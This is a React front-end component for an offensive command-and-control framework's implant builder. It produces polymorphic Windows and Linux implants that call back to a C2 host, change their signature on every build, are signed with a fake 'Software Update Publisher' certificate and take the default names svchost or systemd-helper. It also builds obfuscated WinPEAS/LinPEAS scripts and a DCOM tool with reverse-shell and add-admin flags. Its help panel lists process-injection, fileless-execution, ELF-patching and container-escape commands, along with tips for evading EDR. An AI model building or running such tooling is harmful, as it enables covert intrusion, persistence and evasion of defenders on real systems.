import React, { useCallback, useEffect, useState } from 'react';
import styled from 'styled-components';
import axios from 'axios';
import { toast } from 'react-toastify';
import { FaWindows, FaLinux } from 'react-icons/fa';
import { FiDownload, FiRefreshCw, FiCpu, FiHelpCircle, FiChevronDown, FiTrash2 } from 'react-icons/fi';

const Section = styled.section`
  animation: fadeIn 0.35s ease-out;
  min-height: calc(100vh - 120px);

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(8px); }
    to { opacity: 1; transform: translateY(0); }
  }
`;

const Head = styled.div`
  display: flex;
  align-items: flex-end;
  justify-content: space-between;
  gap: 16px;
  flex-wrap: wrap;
  margin-bottom: 16px;

  h2 {
    margin: 0;
    font-family: 'Syne', system-ui, sans-serif;
    font-size: 22px;
    font-weight: 700;
    letter-spacing: -0.03em;
    color: #eef1f6;
  }

  p {
    margin: 6px 0 0;
    color: #8b93a7;
    font-size: 13px;
    max-width: 560px;
  }
`;

const Grid = styled.div`
  display: grid;
  grid-template-columns: 1.1fr 1fr;
  gap: 28px;

  @media (max-width: 980px) {
    grid-template-columns: 1fr;
  }
`;

const Field = styled.label`
  display: flex;
  flex-direction: column;
  gap: 6px;
  margin-bottom: 12px;
  font-size: 12px;
  color: #8b93a7;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  font-weight: 600;
`;

const Input = styled.input`
  background: #161a22;
  border: 1px solid #2a3140;
  color: #eef1f6;
  border-radius: 8px;
  padding: 10px 12px;
  font-size: 14px;
  font-family: inherit;
  text-transform: none;
  letter-spacing: normal;
  font-weight: 500;
  outline: none;

  &:focus {
    border-color: #c6f23e;
  }
`;

const Select = styled.select`
  background: #161a22;
  border: 1px solid #2a3140;
  color: #eef1f6;
  border-radius: 8px;
  padding: 10px 12px;
  font-size: 14px;
  font-family: inherit;
  text-transform: none;
  letter-spacing: normal;
  font-weight: 500;
  outline: none;

  &:focus {
    border-color: #c6f23e;
  }

  option {
    background: #161a22;
  }
`;

const PlatformRow = styled.div`
  display: flex;
  gap: 8px;
  margin-bottom: 14px;
`;

const SubVariantRow = styled.div`
  display: flex;
  flex-wrap: wrap;
  gap: 6px;
  margin-bottom: 14px;
`;

const SubVariantBtn = styled.button`
  flex: 1 1 30%;
  min-width: 100px;
  padding: 10px 8px;
  border-radius: 8px;
  border: 1px solid ${props => props.$active ? 'rgba(198, 242, 62, 0.28)' : '#2a3140'};
  background: ${props => props.$active ? 'rgba(198, 242, 62, 0.08)' : '#12151c'};
  color: ${props => props.$active ? '#e8f5a0' : '#8b93a7'};
  font-size: 12px;
  font-weight: 600;
  cursor: pointer;
  transition: border-color 0.15s, background 0.15s;

  &:hover {
    border-color: #3d4658;
  }

  &:disabled {
    opacity: 0.45;
    cursor: not-allowed;
  }
`;

const PlatformBtn = styled.button`
  flex: 1;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 12px;
  border-radius: 10px;
  border: 1px solid ${props => props.$active ? 'rgba(198, 242, 62, 0.35)' : '#2a3140'};
  background: ${props => props.$active ? 'rgba(198, 242, 62, 0.12)' : '#161a22'};
  color: ${props => props.$active ? '#c6f23e' : '#aeb6c7'};
  font-family: inherit;
  font-weight: 600;
  font-size: 13px;
  cursor: pointer;
  transition: border-color 0.15s, color 0.15s, background 0.15s;

  &:hover {
    border-color: rgba(198, 242, 62, 0.35);
    color: #c6f23e;
  }
`;

const GenerateBtn = styled.button`
  width: 100%;
  margin-top: 4px;
  padding: 12px 16px;
  border: none;
  border-radius: 10px;
  background: #c6f23e;
  color: #0e1014;
  font-family: inherit;
  font-weight: 700;
  font-size: 14px;
  cursor: pointer;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  transition: background 0.15s;

  &:hover:not(:disabled) {
    background: #d4ff5a;
  }

  &:disabled {
    opacity: 0.55;
    cursor: not-allowed;
  }
`;

const Note = styled.div`
  margin-top: 12px;
  font-size: 12px;
  color: #8b93a7;
  line-height: 1.5;
`;

const SignCard = styled.div`
  margin-top: 4px;
  margin-bottom: 12px;
  padding: 12px 14px;
  border-radius: 10px;
  border: 1px solid #2a3140;
  background: #12151c;
`;

const SignHead = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 10px;
  margin-bottom: 10px;

  label {
    display: flex;
    align-items: center;
    gap: 8px;
    font-size: 13px;
    font-weight: 600;
    color: #eef1f6;
    text-transform: none;
    letter-spacing: normal;
    cursor: pointer;
  }

  input[type='checkbox'] {
    width: 16px;
    height: 16px;
    accent-color: #c6f23e;
  }
`;

const SignMeta = styled.div`
  font-size: 11px;
  color: #8b93a7;
  line-height: 1.45;
  margin-top: 8px;
`;

const LinkBtn = styled.button`
  margin-top: 8px;
  background: transparent;
  border: 1px solid #2a3140;
  color: #c6f23e;
  border-radius: 6px;
  padding: 6px 10px;
  font-size: 11px;
  font-weight: 600;
  font-family: inherit;
  cursor: pointer;
  &:hover { border-color: #c6f23e; }
  &:disabled { opacity: 0.45; cursor: not-allowed; }
`;

const BuildsHead = styled.div`
  display: flex;
  align-items: center;
  justify-content: space-between;
  margin-bottom: 10px;

  h3 {
    margin: 0;
    font-size: 13px;
    text-transform: uppercase;
    letter-spacing: 0.1em;
    color: #5c657a;
    font-weight: 600;
  }
`;

const IconBtn = styled.button`
  background: transparent;
  border: 1px solid #2a3140;
  color: #aeb6c7;
  width: 32px;
  height: 32px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;

  &:hover {
    border-color: #c6f23e;
    color: #c6f23e;
  }
`;

const BuildList = styled.div`
  max-height: 280px;
  overflow-y: auto;
  display: flex;
  flex-direction: column;
  gap: 6px;
`;

const HelpSection = styled.div`
  margin-top: 32px;
  padding-top: 24px;
  border-top: 1px solid #2a3140;
`;

const HelpToggle = styled.button`
  background: transparent;
  border: none;
  color: #8b93a7;
  padding: 0;
  font-size: 16px;
  font-weight: 600;
  display: flex;
  align-items: center;
  gap: 8px;
  cursor: pointer;
  transition: color 0.15s;
  margin-bottom: 16px;

  &:hover {
    color: #c6f23e;
  }

  .chevron {
    transition: transform 0.2s;
    transform: ${props => props.$expanded ? 'rotate(180deg)' : 'rotate(0deg)'};
  }
`;

const HelpContent = styled.div`
  display: ${props => props.$show ? 'block' : 'none'};
  animation: ${props => props.$show ? 'fadeIn 0.3s ease-out' : 'none'};

  @keyframes fadeIn {
    from { opacity: 0; transform: translateY(-8px); }
    to { opacity: 1; transform: translateY(0); }
  }
`;

const HelpTabs = styled.div`
  display: flex;
  gap: 4px;
  margin-bottom: 20px;
  border-bottom: 1px solid #2a3140;
`;

const HelpTab = styled.button`
  background: ${props => props.$active ? 'rgba(198, 242, 62, 0.1)' : 'transparent'};
  border: none;
  color: ${props => props.$active ? '#c6f23e' : '#8b93a7'};
  padding: 10px 16px;
  font-size: 14px;
  font-weight: 500;
  cursor: pointer;
  border-radius: 8px 8px 0 0;
  border-bottom: 2px solid ${props => props.$active ? '#c6f23e' : 'transparent'};
  transition: all 0.15s;

  &:hover {
    color: #c6f23e;
    background: rgba(198, 242, 62, 0.05);
  }

  display: flex;
  align-items: center;
  gap: 6px;
`;

const CommandSection = styled.div`
  margin-bottom: 24px;

  h4 {
    color: #eef1f6;
    font-size: 15px;
    font-weight: 600;
    margin: 0 0 12px;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  p {
    color: #8b93a7;
    font-size: 13px;
    margin: 0 0 12px;
    line-height: 1.5;
  }
`;

const CommandList = styled.div`
  display: flex;
  flex-direction: column;
  gap: 8px;
`;

const Command = styled.div`
  background: #161a22;
  border: 1px solid #2a3140;
  border-radius: 6px;
  padding: 12px;

  .cmd-name {
    color: #c6f23e;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    font-weight: 600;
    margin-bottom: 4px;
  }

  .cmd-desc {
    color: #aeb6c7;
    font-size: 12px;
    line-height: 1.4;
  }

  .cmd-example {
    color: #5c657a;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 11px;
    margin-top: 6px;
    padding: 6px 8px;
    background: rgba(0, 0, 0, 0.3);
    border-radius: 4px;
  }
`;

const BuildRow = styled.div`
  display: grid;
  grid-template-columns: 28px 1fr auto;
  gap: 10px;
  align-items: center;
  padding: 10px 8px;
  border-bottom: 1px solid #1e2430;
`;

const BuildMeta = styled.div`
  min-width: 0;

  .name {
    font-size: 13px;
    font-weight: 600;
    color: #eef1f6;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }

  .sub {
    font-size: 11px;
    color: #8b93a7;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
  }
`;

const authHeaders = () => ({
  Authorization: `Bearer ${localStorage.getItem('fahis_token') || localStorage.getItem('c2_token') || ''}`,
});

function formatBytes(n) {
  if (!n && n !== 0) return '';
  if (n < 1024) return `${n} B`;
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`;
  return `${(n / (1024 * 1024)).toFixed(2)} MB`;
}

const ImplantBuilder = () => {
  const [platform, setPlatform] = useState('windows');
  const [windowsVariant, setWindowsVariant] = useState('implant'); // implant | dcom | winpeas
  const [linuxVariant, setLinuxVariant] = useState('implant'); // implant | linpeas
  const [arch, setArch] = useState('amd64');
  const [format, setFormat] = useState('exe');
  const [host, setHost] = useState('127.0.0.1');
  const [port, setPort] = useState(2026);
  const [outputName, setOutputName] = useState('');
  const [busy, setBusy] = useState(false);
  const [builds, setBuilds] = useState([]);
  const [helpExpanded, setHelpExpanded] = useState(false);
  const [helpTab, setHelpTab] = useState('windows');
  const [signingInfo, setSigningInfo] = useState(null);
  const [signSubject, setSignSubject] = useState('');
  const [linpeasAvailable, setLinpeasAvailable] = useState(true);
  const [linpeasAutoFetch, setLinpeasAutoFetch] = useState(true);
  const [linpeasFetching, setLinpeasFetching] = useState(false);

  const loadDefaults = useCallback(async () => {
    try {
      const res = await axios.get('/api/builder/defaults', { headers: authHeaders() });
      if (res.data?.host) setHost(res.data.host);
      if (res.data?.port) setPort(res.data.port);
      if (res.data?.signing) {
        setSigningInfo(res.data.signing);
        setSignSubject((prev) => prev || res.data.signing.defaultSubject || '');
      }
      if (typeof res.data?.linpeasAvailable === 'boolean') {
        setLinpeasAvailable(res.data.linpeasAvailable);
      }
      if (typeof res.data?.linpeasAutoFetch === 'boolean') {
        setLinpeasAutoFetch(res.data.linpeasAutoFetch);
      }
    } catch (e) {
      /* keep defaults */
    }
  }, []);

  const loadBuilds = useCallback(async () => {
    try {
      const res = await axios.get('/api/builder/builds', { headers: authHeaders() });
      setBuilds(res.data?.builds || []);
    } catch (e) {
      /* ignore */
    }
  }, []);

  useEffect(() => {
    loadDefaults();
    loadBuilds();
  }, [loadDefaults, loadBuilds]);

  const ensureLinpeasSource = useCallback(async (silent) => {
    if (linpeasFetching) return false;
    setLinpeasFetching(true);
    try {
      const res = await axios.post(
        '/api/builder/linpeas/ensure',
        {},
        { headers: authHeaders(), timeout: 300000 }
      );
      if (res.data?.success) {
        setLinpeasAvailable(true);
        if (!silent) toast.success('LinPEAS source ready on teamserver');
        return true;
      }
    } catch (e) {
      if (!silent) toast.error(e.response?.data?.error || e.message || 'Could not fetch linpeas.sh');
    } finally {
      setLinpeasFetching(false);
    }
    return false;
  }, [linpeasFetching]);

  const isDcom = platform === 'windows' && windowsVariant === 'dcom';
  const isWinpeas = platform === 'windows' && windowsVariant === 'winpeas';
  const isLinpeas = platform === 'linux' && linuxVariant === 'linpeas';
  const isScriptOnly = isLinpeas || isWinpeas;

  useEffect(() => {
    if (!isLinpeas || linpeasAvailable || !linpeasAutoFetch) return;
    ensureLinpeasSource(true);
  }, [isLinpeas, linpeasAvailable, linpeasAutoFetch, ensureLinpeasSource]);

  const handleGenerate = async () => {
    if (!isDcom && !isScriptOnly && !host.trim()) {
      toast.error('C2 host is required');
      return;
    }
    setBusy(true);
    try {
      if (isLinpeas && !linpeasAvailable) {
        const ok = await ensureLinpeasSource(true);
        if (!ok) {
          toast.error('LinPEAS source missing — check teamserver can reach GitHub or place linpeas.sh manually');
          return;
        }
      }
      const res = await axios.post(
        '/api/builder/generate',
        {
          platform,
          variant: platform === 'windows' ? windowsVariant : linuxVariant,
          arch,
          format: platform === 'windows' ? format : 'exe',
          host: host.trim() || undefined,
          port: Number(port),
          outputName: outputName.trim() || undefined,
          signCode: platform === 'windows' && !isWinpeas,
          signSubject: platform === 'windows' && !isWinpeas ? (signSubject.trim() || undefined) : undefined,
          signAuto: true,
          buildNonce: typeof crypto !== 'undefined' && crypto.randomUUID
            ? crypto.randomUUID()
            : `${Date.now()}_${Math.random()}`,
        },
        { headers: authHeaders(), timeout: 300000 }
      );
      const b = res.data?.build;
      if (isDcom && b?.tool !== 'go-dcom') {
        toast.error(
          'Expected DCOM Go build (go-dcom) — pick "DCOM tool (Go)", restart node server, and hard-refresh the dashboard.'
        );
      } else if (isLinpeas && b?.tool !== 'linpeas-sh') {
        toast.error('Expected LinPEAS build (linpeas-sh) — pick "LinPEAS (shell)" and restart the server.');
      } else if (isWinpeas && b?.tool !== 'winpeas-bat') {
        toast.error('Expected WinPEAS build (winpeas-bat) — pick "WinPEAS (bat)" and restart the server.');
      } else if (b?.authenticodeSigned) {
        toast.success(`Signed ${b.tool || 'build'} · sha256 ${b.sha256?.slice(0, 12) || '?'}…`);
      } else if (platform === 'windows' && b?.signNote) {
        toast.warn(`Build ready but unsigned: ${b.signNote} · ${b.sha256?.slice(0, 12) || ''}…`);
      } else {
        toast.success(`${b.tool || platform} ready · sha256 ${b.sha256?.slice(0, 12) || ''}…`);
      }
      await loadBuilds();
      try {
        const st = await axios.get('/api/builder/signing/status', { headers: authHeaders() });
        if (st.data) setSigningInfo(st.data);
      } catch (_) {}
    } catch (e) {
      toast.error(e.response?.data?.error || e.message || 'Build failed');
    } finally {
      setBusy(false);
    }
  };

  const handleDownload = async (id, fileName) => {
    const token = localStorage.getItem('fahis_token') || localStorage.getItem('c2_token') || '';
    if (!token) {
      toast.error('Not logged in — refresh and sign in again');
      return;
    }
    try {
      // Prefer direct link (?token=) — reliable for large EXE; avoids axios blob failures
      const href = `/api/builder/download/${encodeURIComponent(id)}?token=${encodeURIComponent(token)}`;
      const a = document.createElement('a');
      a.href = href;
      a.download = fileName || 'implant';
      a.rel = 'noopener';
      document.body.appendChild(a);
      a.click();
      a.remove();
      toast.success('Download started');
    } catch (e) {
      // Fallback: fetch → blob
      try {
        const res = await fetch(`/api/builder/download/${encodeURIComponent(id)}`, {
          headers: { Authorization: `Bearer ${token}` },
        });
        if (!res.ok) {
          let msg = `Download failed (${res.status})`;
          try {
            const j = await res.json();
            if (j?.error) msg = j.error;
          } catch (_) {}
          toast.error(msg);
          return;
        }
        const blob = await res.blob();
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = fileName || 'implant';
        document.body.appendChild(a);
        a.click();
        a.remove();
        window.URL.revokeObjectURL(url);
        toast.success('Download started');
      } catch (e2) {
        toast.error(e2.message || 'Download failed');
      }
    }
  };

  const handleDownloadLabCer = () => {
    const token = localStorage.getItem('fahis_token') || localStorage.getItem('c2_token') || '';
    if (!token) {
      toast.error('Not logged in');
      return;
    }
    const a = document.createElement('a');
    a.href = `/api/builder/signing/lab-cer?token=${encodeURIComponent(token)}`;
    a.download = 'lab-codesign.cer';
    a.rel = 'noopener';
    document.body.appendChild(a);
    a.click();
    a.remove();
    toast.info('Import .cer on test VM → Trusted Root + Trusted Publishers');
  };

  const handleDelete = async (id, fileName) => {
    if (!window.confirm(`Delete build "${fileName}"?`)) {
      return;
    }
    
    try {
      await axios.delete(`/api/builder/delete/${id}`, { headers: authHeaders() });
      toast.success('Build deleted');
      await loadBuilds();
    } catch (e) {
      toast.error(e.response?.data?.error || 'Delete failed');
    }
  };

  const windowsCommands = [
    {
      name: 'processes',
      desc: 'List processes and copy the host PID you want to live inside',
      example: 'processes'
    },
    {
      name: 'migrate',
      desc: 'REAL inject: drop embedded DLL into that PID via LoadLibrary. Session dies when THAT PID dies.',
      example: 'migrate 3640'
    },
    {
      name: 'injectdll',
      desc: 'REAL inject of a .dll path only (not .exe). Same LoadLibrary behavior as migrate.',
      example: 'injectdll 3640 C:\\Users\\cui12\\AppData\\Local\\Temp\\mshelper_123.dll'
    },
    {
      name: 'checkpersistence',
      desc: 'Show TEMP persistence path of this session',
      example: 'checkpersistence'
    }
  ];

  const linuxCommands = [
    {
      name: 'injectso',
      desc: 'Inject shared library using dlopen via ptrace',
      example: 'injectso 1234 /path/to/payload.so'
    },
    {
      name: 'injectshellcode',
      desc: 'Direct shellcode injection via ptrace',
      example: 'injectshellcode 1234 \\x48\\x31\\xc0\\x50\\x48\\x89\\xe2...'
    },
    {
      name: 'ldpreload',
      desc: 'LD_PRELOAD hijacking for new processes',
      example: 'ldpreload /path/to/malicious.so /bin/target_program'
    },
    {
      name: 'memfd',
      desc: 'Fileless execution using memfd_create',
      example: 'memfd payload_base64_data target_args'
    },
    {
      name: 'ptraceattach',
      desc: 'Attach to process and manipulate memory/registers',
      example: 'ptraceattach 1234 register_dump'
    },
    {
      name: 'elfpatch',
      desc: 'Patch ELF binary entry point or GOT',
      example: 'elfpatch /path/to/binary payload_shellcode_hex'
    },
    {
      name: 'sostomp',
      desc: 'Shared object stomping - replace loaded .so',
      example: 'sostomp 1234 libc.so.6 /path/to/payload.so'
    },
    {
      name: 'cgroupescape',
      desc: 'Container escape via cgroup manipulation',
      example: 'cgroupescape /host_path_to_exploit'
    }
  ];

  return (
    <Section>
      <Head>
        <div>
          <h2>Generate implant</h2>
          <p>
            {isDcom
              ? 'Build the Go DCOM module (GodPotato-style). Same toolchain as the C2 implant — obfuscated strings, unique build ID, and padding every generation.'
              : isWinpeas
                ? 'Generate a polymorphic WinPEAS batch file: gzip payload, random chunked variables, PowerShell decode stub, build stamp — new sha256 every time.'
              : isLinpeas
                ? 'Generate a polymorphic LinPEAS script: gzip payload, random chunked base64 wrapper, build stamp, and tail entropy — new sha256 every time.'
                : 'Build a fresh Windows or Linux binary from lastfinalversion2.go. Every generation rotates XOR keys, shift, strings, and padding so the signature changes.'}
          </p>
        </div>
      </Head>

      <Grid>
        <div>
          <PlatformRow>
            <PlatformBtn
              type="button"
              $active={platform === 'windows'}
              onClick={() => setPlatform('windows')}
            >
              <FaWindows /> Windows
            </PlatformBtn>
            <PlatformBtn
              type="button"
              $active={platform === 'linux'}
              onClick={() => {
                setPlatform('linux');
                setWindowsVariant('implant');
                setLinuxVariant('implant');
              }}
            >
              <FaLinux /> Linux
            </PlatformBtn>
          </PlatformRow>

          {platform === 'windows' && (
            <SubVariantRow>
              <SubVariantBtn
                type="button"
                $active={windowsVariant === 'implant'}
                onClick={() => setWindowsVariant('implant')}
                disabled={busy}
              >
                C2 implant (Go)
              </SubVariantBtn>
              <SubVariantBtn
                type="button"
                $active={windowsVariant === 'dcom'}
                onClick={() => {
                  setWindowsVariant('dcom');
                  if (arch !== 'amd64') setArch('amd64');
                }}
                disabled={busy}
              >
                DCOM tool (Go)
              </SubVariantBtn>
              <SubVariantBtn
                type="button"
                $active={windowsVariant === 'winpeas'}
                onClick={() => setWindowsVariant('winpeas')}
                disabled={busy}
              >
                WinPEAS (bat)
              </SubVariantBtn>
            </SubVariantRow>
          )}

          {platform === 'linux' && (
            <SubVariantRow>
              <SubVariantBtn
                type="button"
                $active={linuxVariant === 'implant'}
                onClick={() => setLinuxVariant('implant')}
                disabled={busy}
              >
                C2 implant (Go)
              </SubVariantBtn>
              <SubVariantBtn
                type="button"
                $active={linuxVariant === 'linpeas'}
                onClick={() => setLinuxVariant('linpeas')}
                disabled={busy}
              >
                LinPEAS (shell)
              </SubVariantBtn>
            </SubVariantRow>
          )}

          <Field>
            Architecture
            <Select
              value={arch}
              onChange={(e) => setArch(e.target.value)}
              disabled={isDcom || isScriptOnly}
            >
              <option value="amd64">amd64 (x64)</option>
              <option value="386">386 (x86)</option>
              <option value="arm64">arm64</option>
            </Select>
          </Field>

          {platform === 'windows' && !isDcom && !isWinpeas && (
            <Field>
              Output format
              <Select value={format} onChange={(e) => setFormat(e.target.value)}>
                <option value="exe">EXE + embedded inject DLL (recommended)</option>
                <option value="dll">DLL only (for injectdll path)</option>
              </Select>
            </Field>
          )}

          {!isScriptOnly && (
            <>
              <Field>
                {isDcom ? 'Default lhost (optional)' : 'C2 Host'}
                <Input
                  value={host}
                  onChange={(e) => setHost(e.target.value)}
                  placeholder={isDcom ? 'Embedded -H default (runtime flags override)' : '127.0.0.1 or your domain'}
                />
              </Field>

              <Field>
                {isDcom ? 'Default lport (optional)' : 'C2 Port'}
                <Input
                  type="number"
                  value={port}
                  onChange={(e) => setPort(e.target.value)}
                  min={isDcom ? 0 : 1}
                  max={65535}
                />
              </Field>
            </>
          )}

          <Field>
            Output name (optional)
            <Input
              value={outputName}
              onChange={(e) => setOutputName(e.target.value)}
              placeholder={
                isLinpeas
                  ? 'host_audit'
                  : isWinpeas
                    ? 'win_audit'
                    : platform === 'windows'
                      ? 'svchost'
                      : 'systemd-helper'
              }
            />
          </Field>

          {platform === 'windows' && !isWinpeas && (
            <SignCard>
              <SignMeta style={{ marginTop: 0 }}>
                <strong style={{ color: '#aeb6c7' }}>Authenticode:</strong> every Windows EXE/DLL is signed
                automatically when you generate (lab cert). Check File → Properties → Digital Signatures.
                {signingInfo?.canSignWindows
                  ? ''
                  : signingInfo?.hostIsWindows
                    ? ' Install Windows SDK (signtool) on this teamserver.'
                    : ' Teamserver must run on Windows to sign.'}
                {signingInfo?.pfxConfigured && (
                  <> PFX: <code>{signingInfo.pfxFile}</code>.</>
                )}
              </SignMeta>
              <Field style={{ marginBottom: 0, marginTop: 10 }}>
                Publisher name (optional, first lab cert only)
                <Input
                  value={signSubject}
                  onChange={(e) => setSignSubject(e.target.value)}
                  placeholder="CN=Software Update Publisher, O=..."
                  disabled={busy}
                />
              </Field>
              <LinkBtn type="button" onClick={handleDownloadLabCer}>
                Download trust cert (.cer) for test VM
              </LinkBtn>
            </SignCard>
          )}

          <GenerateBtn type="button" onClick={handleGenerate} disabled={busy}>
            <FiCpu />
            {busy
              ? 'Building (unique signature)…'
              : isDcom
                ? 'Generate DCOM EXE (Go)'
                : isWinpeas
                  ? 'Generate WinPEAS batch'
                : isLinpeas
                  ? 'Generate LinPEAS script'
                  : platform === 'windows'
                    ? format === 'dll'
                      ? 'Generate Windows DLL'
                      : 'Generate Windows EXE (+ inject DLL)'
                    : 'Generate Linux binary'}
          </GenerateBtn>

          {isDcom ? (
            <Note>
              Standalone Go binary (no Crystal). CLI: <code>-c</code> command, <code>-H/-P</code> reverse shell,{' '}
              <code>-u/-pw</code> add local admin, <code>-p</code> pipe name. Built with the same Go compiler as the implant.
            </Note>
          ) : isWinpeas ? (
            <Note>
              Obfuscated <code>.bat</code> from <code>winPEAS.bat</code>. Run from a path without spaces{' '}
              (WinPEAS requirement). Needs PowerShell on the host for the stub decode. Authorized testing only.
            </Note>
          ) : isLinpeas ? (
            <Note>
              {!linpeasAvailable && (
                <>
                  <span style={{ color: '#ff8a8a' }}>
                    {linpeasFetching
                      ? 'Downloading official linpeas.sh to teamserver (first time may take a minute)…'
                      : 'LinPEAS source not cached yet — auto-download on generate, or fetch now.'}
                  </span>
                  {!linpeasFetching && linpeasAutoFetch && (
                    <>
                      {' '}
                      <button
                        type="button"
                        style={{
                          background: 'transparent',
                          border: '1px solid #666',
                          color: '#ccc',
                          cursor: 'pointer',
                          padding: '2px 8px',
                          borderRadius: 4,
                        }}
                        onClick={() => ensureLinpeasSource(false)}
                      >
                        Fetch now
                      </button>
                    </>
                  )}
                  <br />
                </>
              )}
              Obfuscated <code>.sh</code> from <code>linpeas.sh</code>. Run on target:{' '}
              <code>chmod +x file.sh &amp;&amp; ./file.sh</code> (same LinPEAS flags: <code>-a</code>, <code>-s</code>, etc.).
              Authorized testing only.
            </Note>
          ) : platform === 'windows' ? (
            <Note>
              Windows EXE builds embed a real inject DLL. After you connect, run{' '}
              <code>migrate &lt;pid&gt;</code> — the session then lives inside that process
              (kill the host PID to kill the session). Do not inject an .exe path.
            </Note>
          ) : (
            <Note>
              Linux implant connects to your C2 with the same polymorphic Go build as Windows (no DLL pack).
            </Note>
          )}

        </div>

        <div>
          <BuildsHead>
            <h3>Recent builds</h3>
            <IconBtn type="button" onClick={loadBuilds} title="Refresh">
              <FiRefreshCw size={14} />
            </IconBtn>
          </BuildsHead>

          <BuildList>
            {builds.length === 0 ? (
              <div style={{ color: '#5c657a', fontSize: 13, padding: '12px 0' }}>
                No builds yet. Generate one to see it here.
              </div>
            ) : (
              builds.map((b) => (
                <BuildRow key={b.id}>
                  <div style={{ color: '#c6f23e' }}>
                    {b.platform === 'linux' ? <FaLinux /> : <FaWindows />}
                  </div>
                  <BuildMeta>
                    <div className="name">{b.fileName}</div>
                    <div className="sub">
                      {b.platform}/{b.arch}
                      {b.variant === 'dcom' || b.tool === 'go-dcom' ? ' · go-dcom' : ''}
                      {b.variant === 'linpeas' || b.tool === 'linpeas-sh' ? ' · linpeas-sh' : ''}
                      {b.variant === 'winpeas' || b.tool === 'winpeas-bat' ? ' · winpeas-bat' : ''}
                      {b.format ? `/${b.format}` : ''}
                      {b.injectDllPacked ? ' · migrate-ready' : ''}
                      {b.authenticodeSigned ? ` · signed${b.signPublisher ? ` (${b.signPublisher.split(',')[0].replace('CN=', '')})` : ''}` : ''}
                      {b.host ? ` · ${b.host}:${b.port}` : ''} ·{' '}
                      {formatBytes(b.size)} · {new Date(b.createdAt).toLocaleString()} ·{' '}
                      {b.sha256?.slice(0, 8)}
                    </div>
                  </BuildMeta>
                  <div style={{ display: 'flex', gap: 4 }}>
                    <IconBtn
                      type="button"
                      title="Download"
                      onClick={() => handleDownload(b.id, b.fileName)}
                    >
                      <FiDownload size={14} />
                    </IconBtn>
                    <IconBtn
                      type="button"
                      title="Delete"
                      onClick={() => handleDelete(b.id, b.fileName)}
                      style={{ color: '#ff6b7a' }}
                    >
                      <FiTrash2 size={14} />
                    </IconBtn>
                  </div>
                </BuildRow>
              ))
            )}
          </BuildList>
        </div>
      </Grid>

      <HelpSection>
        <HelpToggle 
          $expanded={helpExpanded}
          onClick={() => setHelpExpanded(!helpExpanded)}
        >
          <FiHelpCircle />
          Advanced Commands & DLL Injection
          <FiChevronDown className="chevron" />
        </HelpToggle>

        <HelpContent $show={helpExpanded}>
          <HelpTabs>
            <HelpTab 
              $active={helpTab === 'windows'}
              onClick={() => setHelpTab('windows')}
            >
              <FaWindows /> Windows
            </HelpTab>
            <HelpTab 
              $active={helpTab === 'linux'}
              onClick={() => setHelpTab('linux')}
            >
              <FaLinux /> Linux
            </HelpTab>
          </HelpTabs>

          {helpTab === 'windows' && (
            <div>
              <CommandSection>
                <h4>🔥 DLL Injection Techniques</h4>
                <p>
                  Force running processes to load your DLL, executing code with target privileges.
                  Use PID from <code>processes</code> command.
                </p>
                <CommandList>
                  {windowsCommands.map((cmd, i) => (
                    <Command key={i}>
                      <div className="cmd-name">{cmd.name}</div>
                      <div className="cmd-desc">{cmd.desc}</div>
                      <div className="cmd-example">Example: {cmd.example}</div>
                    </Command>
                  ))}
                </CommandList>
              </CommandSection>

              <CommandSection>
                <h4>📋 Real inject (session tied to host PID)</h4>
                <p>
                  1. Generate <b>EXE + embedded inject DLL</b> and run the EXE<br/>
                  2. <code>processes</code> → copy target PID (e.g. notepad)<br/>
                  3. <code>migrate 3640</code><br/>
                  4. New session appears — it lives <b>inside</b> that PID<br/>
                  5. Kill original EXE → session stays · Kill PID 3640 → session dies
                </p>
              </CommandSection>

              <CommandSection>
                <h4>🛠️ Detection Evasion</h4>
                <p>
                  Modern EDRs detect CreateRemoteThread, RWX memory, and abnormal modules.
                  Use APC injection for stealth. Manual mapping bypasses LoadLibrary hooks.
                </p>
              </CommandSection>
            </div>
          )}

          {helpTab === 'linux' && (
            <div>
              <CommandSection>
                <h4>🔥 Process Injection & SO Loading</h4>
                <p>
                  Linux injection via ptrace, LD_PRELOAD, and memory manipulation.
                  Use PID from <code>processes</code> command.
                </p>
                <CommandList>
                  {linuxCommands.map((cmd, i) => (
                    <Command key={i}>
                      <div className="cmd-name">{cmd.name}</div>
                      <div className="cmd-desc">{cmd.desc}</div>
                      <div className="cmd-example">Example: {cmd.example}</div>
                    </Command>
                  ))}
                </CommandList>
              </CommandSection>

              <CommandSection>
                <h4>🛠️ Stealth Considerations</h4>
                <p>
                  Avoid /proc inspection, use memfd for fileless payloads.
                  Container escapes require host filesystem access.
                </p>
              </CommandSection>
            </div>
          )}
        </HelpContent>
      </HelpSection>
    </Section>
  );
};

export default ImplantBuilder;
